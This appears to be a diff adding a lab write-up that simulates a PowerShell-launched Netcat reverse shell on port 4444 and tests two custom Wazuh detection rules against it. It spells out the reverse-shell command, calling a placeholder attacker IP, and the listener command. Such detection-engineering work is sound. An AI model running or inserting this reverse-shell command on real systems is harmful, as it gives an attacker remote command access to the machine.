@@ -1,0 +1,55 @@
+🎯 Objective
+The objective of this simulation is to detect reverse shell activity initiated via PowerShell using Netcat. The focus is on identifying suspicious behavior such as abnormal parent-child process relationships (e.g., PowerShell spawning Netcat), the use of obfuscated or bypassing PowerShell flags, and outbound network connections on uncommon ports (e.g., port 4444).
+This helps validate the effectiveness of custom Wazuh rules in identifying post-exploitation techniques used by attackers.
+
+✅ Simulation Overview
+To simulate a reverse shell, we used a common attack technique where PowerShell is used to execute Netcat (nc64.exe) to establish a reverse connection back to an attacker's system. This is a classic post-exploitation tactic used in red teaming and real-world intrusions.
+
+--> Simulated command executed on the victim (Kali Windows host):
+    powershell.exe -NoP -NonI -Exec Bypass -Command ".\nc64.exe -e cmd.exe <attacker-ip> 4444"
+
+--> Attacker system listener:
+    nc64.exe -lvnp 4444
+
+🔍 Wazuh Detection Rules Used
+Rule 1: PowerShell reverse shell behavior
+<group name="custom_malware_detection">
+  <rule id="100700" level="15">
+    <if_sid>92213</if_sid>
+    <description>Custom alert: PowerShell reverse shell behavior</description>
+  </rule>
+</group>
+ ** Parent rule SID 92213: Likely monitors suspicious PowerShell execution or encoded commands.
+ ** Purpose: Triggers on PowerShell executions that may indicate a reverse shell behavior.
+
+Rule 2: Outbound connection on suspicious port
+<group name="reverse_shell,powershell,sysmon">
+  <rule id="100102" level="10">
+    <if_sid>92057</if_sid>
+    <match>4444</match>
+    <description>Custom: PowerShell reverse shell connection</description>
+  </rule>
+</group>
+ ** Parent rule SID 92057: Detects network connections or command line arguments.
+ ** Match: The rule looks for the string 4444 (commonly used in attacker listeners).
+ ** Purpose: Detects connections to attacker-controlled systems on known ports.
+
+🧠 Detection Analysis
+1- Parent-child process relationship observed:
+    ** powershell.exe → nc64.exe → cmd.exe
+
+2- Unusual behavior:
+    ** PowerShell executing an external binary (nc64.exe)
+    ** -NoP -NonI -Exec Bypass flags used to evade detection and policy restrictions
+
+3- Outbound connection:
+    ** Attempt to establish a reverse TCP connection to attacker IP on port 4444
+
+📈 Detection Result in Wazuh
+Both custom rules were triggered:
+ ** Rule ID 100700 (Level 15): Triggered when PowerShell launched nc64.exe with suspicious parameters.
+ ** Rule ID 100102 (Level 10): Triggered due to detection of port 4444 in the command line, matching potential reverse shell behavior.
+
+🔚 Conclusion
+This simulation successfully triggered Wazuh detections for a PowerShell-based reverse shell. The combination of process behavior and network connection on an uncommon port was effective in flagging the attack. 
+These types of rules are critical in early detection of lateral movement and post-exploitation activities in compromised environments.
